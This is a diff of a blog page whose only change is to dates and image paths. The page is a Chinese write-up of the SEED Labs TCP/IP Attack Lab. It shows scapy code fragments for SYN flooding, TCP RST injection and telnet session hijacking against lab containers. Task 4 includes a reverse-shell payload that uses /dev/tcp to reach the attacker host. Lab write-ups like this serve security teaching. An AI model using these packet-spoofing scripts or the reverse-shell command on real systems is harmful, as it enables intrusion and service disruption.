@@ -307,7 +307,7 @@
                          <a href="/categories/SeedLabs2.0" target="_blank" >SeedLabs2.0</a>
                     
                 </div>
-                <p>2025-11-13 14:55:42</p>
+                <p>2025-11-19 14:55:42</p>
             </div>
         </div>
     </div>
@@ -323,17 +323,17 @@
     
 
     <h1 id="TCP-IP-Attack-Lab"><a href="#TCP-IP-Attack-Lab" class="headerlink" title="TCP&#x2F;IP Attack Lab"></a>TCP&#x2F;IP Attack Lab</h1><p>本次实验的环境如图所示。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119091706714.png" alt="image-20251119091706714"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119091706714.png" alt="image-20251119091706714"></p>
 <p>记得去删除之前实验创建的container，不然会报错。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119095804869.png" alt="image-20251119095804869"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119095804869.png" alt="image-20251119095804869"></p>
 <p>实验中需要使用telnet来连接，container中已经构建创建好了一个名为<code>seed</code>账户，密码为<code>dees</code>。</p>
 <h2 id="Task-1-SYN-Flooding-Attack"><a href="#Task-1-SYN-Flooding-Attack" class="headerlink" title="Task 1: SYN Flooding Attack"></a>Task 1: SYN Flooding Attack</h2><p>这个攻击是通过伪造一些IP地址，来填满受害者主机的队列，使其无法与其他主机建立连接。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119132433602.png" alt="image-20251119132433602"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119132433602.png" alt="image-20251119132433602"></p>
 <p>可以通过<code>sysctl net.ipv4.tcp_max_syn_backlog</code>来查看大小。</p>
 <p>也可以通过<code>netstat -nat</code>来查看队列的使用情况。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119101053113.png" alt="image-20251119101053113"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119101053113.png" alt="image-20251119101053113"></p>
 <p><strong>SYN Cookie Countermeasure</strong>:针对这种攻击方式，系统通过<code>SYN cookie</code>来进行防护。在实验中，docker容器的防护都已经被关闭（可以通过docker-compose.yml查看）。同时还要将docker中的privileged设置为true，才能实现该控制，因为这个文件是一个只读文件。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119101346749.png" alt="image-20251119101346749"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119101346749.png" alt="image-20251119101346749"></p>
 <p>相关控制指令</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sysctl</span> <span class="token parameter variable">-a</span> <span class="token operator">|</span> <span class="token function">grep</span> syncookies     <span class="token punctuation">(</span>Display the SYN cookie flag<span class="token punctuation">)</span>
 <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.tcp_syncookies</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">(</span>turn off SYN cookie<span class="token punctuation">)</span>
@@ -360,19 +360,19 @@ pkt <span class="token operator">=</span> ip<span class="token operator">/</span
     send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以看见受害者主机多了很多连接状态。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119103329729.png" alt="image-20251119103329729"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119103329729.png" alt="image-20251119103329729"></p>
 <p>此时我试图通过telnet连接的时候，会卡住无法连接，最后导致失败。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119102802958.png" alt="image-20251119102802958"></p>
-<p><img src="/2025/11/13/seedlab5/image-20251119103038350.png" alt="image-20251119103038350"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119102802958.png" alt="image-20251119102802958"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119103038350.png" alt="image-20251119103038350"></p>
 <p><strong>一些问题</strong></p>
 <ol>
 <li>如果主机已经跟受害主机建立过TCP连接，那么就算在被遭受攻击，也能够成功连接。这是由于内核的缓解机制：当SYN Cookies功能被禁用时，TCP会为“已验证的目的地”预留四分之一的后备队列空间。因此后续来自该地址的连接将使用预留槽位，从而不受SYN洪水攻击影响。若需消除此缓解措施的效果，可在服务器端执行“ip tcp metrics flush”命令。</li>
 <li>TCP重传机制：发送SYN+ACK数据包后，受害主机将等待ACK数据包。若ACK未能及时到达，TCP将重传SYN+ACK数据包。重传次数取决于以下内核参数（默认值为5）。<br>经过5次重传后，TCP将从半开连接队列中移除对应项。每次移除项都会释放一个槽位。攻击数据包与合法telnet连接请求将争夺此空位。由于Python程序运行速度可能不足，可能输给合法telnet数据包。为赢得竞争，可并行运行多个攻击程序实例。请尝试此方法并观察成功率是否提升。</li>
 </ol>
 <h3 id="Task-1-2-Launch-the-Attack-Using-C"><a href="#Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="Task 1.2: Launch the Attack Using C"></a>Task 1.2: Launch the Attack Using C</h3><p>效果跟task1.1类似。但是c语言更快，成功的概率更高。（代码由实验手册提供）</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119105848660.png" alt="image-20251119105848660"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119105848660.png" alt="image-20251119105848660"></p>
 <h3 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="Task 1.3: Enable the SYN Cookie Countermeasure"></a>Task 1.3: Enable the SYN Cookie Countermeasure</h3><p>我可以打开syncookies防护，然后打开攻击，发现telnet能够连接上</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119110830649.png" alt="image-20251119110830649"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119110830649.png" alt="image-20251119110830649"></p>
 <h2 id="Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="Task 2: TCP RST Attacks on telnet Connections"></a>Task 2: TCP RST Attacks on <strong>telnet</strong> Connections</h2><p>TCP RST攻击可终止两个受害者之间已建立的TCP连接。例如，当用户A与B之间存在已建立的telnet连接（TCP）时，攻击者可伪造从A发往B的RST数据包，从而破坏该现有连接。要使此攻击成功，攻击者需正确构造TCP RST数据包。</p>
 <p>也可以实现自动化，首先监听报文，然后篡改。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
@@ -389,9 +389,9 @@ f <span class="token operator">=</span> <span class="token string-interpolation"
 pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-6a333ca53e4c'</span><span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_pkt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我用一个用户主机尝试连接<code>10.9.0.5</code>时，会被中断。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119115549744.png" alt="image-20251119115549744"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119115549744.png" alt="image-20251119115549744"></p>
 <h2 id="Task-3-TCP-Session-Hijacking"><a href="#Task-3-TCP-Session-Hijacking" class="headerlink" title="Task 3: TCP Session Hijacking"></a>Task 3: TCP Session Hijacking</h2><p>TCP会话劫持攻击的目标是通过向现有TCP连接（会话）注入恶意内容，劫持两个受害者之间的通信通道。若该连接为Telnet会话，攻击者可向其中注入恶意指令（例如删除重要文件），迫使受害者执行这些指令。下图展示了攻击的运作机制。在本任务中，你需要演示如何劫持两台计算机间的telnet会话。你的目标是使telnet服务器执行你发送的恶意命令。</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119120127610.png" alt="image-20251119120127610"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119120127610.png" alt="image-20251119120127610"></p>
 <p>构建了代码，如果监听到<code>10.9.0.5</code>发送的报文则，返回一个伪造的报文。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
 <span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -410,13 +410,13 @@ f <span class="token operator">=</span> <span class="token string-interpolation"
 pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b10103161082'</span><span class="token punctuation">,</span> <span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof_pkt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>首先<code>10.9.0.6</code>连接到<code>10.9.0.5</code>，然后运行该程序</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119171005354.png" alt="image-20251119171005354"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119171005354.png" alt="image-20251119171005354"></p>
 <p>telnet连接卡死，同时发现多了一个hijacking文件</p>
-<p><img src="/2025/11/13/seedlab5/image-20251119171139802.png" alt="image-20251119171139802"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119171139802.png" alt="image-20251119171139802"></p>
 <h2 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>Task 4: Creating Reverse Shell using TCP Session Hijacking</h2><p>在task3的基础上，只需要修改data段即可。获取反向shell的命令如下。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2>&amp;1\n\0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2025/11/13/seedlab5/image-20251119173034349.png" alt="image-20251119173034349"></p>
+<p><img src="/2025/11/19/seedlab5/image-20251119173034349.png" alt="image-20251119173034349"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个实验学习到了TCP SYN Flooding攻击、TCP RST攻击和TCP Session Hijacking。三种攻击方式的原理都比较简单，通过scapy构建报文也不算难。</p>
 
   </div>
@@ -487,7 +487,7 @@ Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
     
 
     
-    <a href="/2025/11/13/seedlab6/">
+    <a href="/2025/11/19/seedlab6/">
         <div class="post-paging-next">
             <span>下一篇</span>
             <p>The Kaminsky Attack Lab</p>
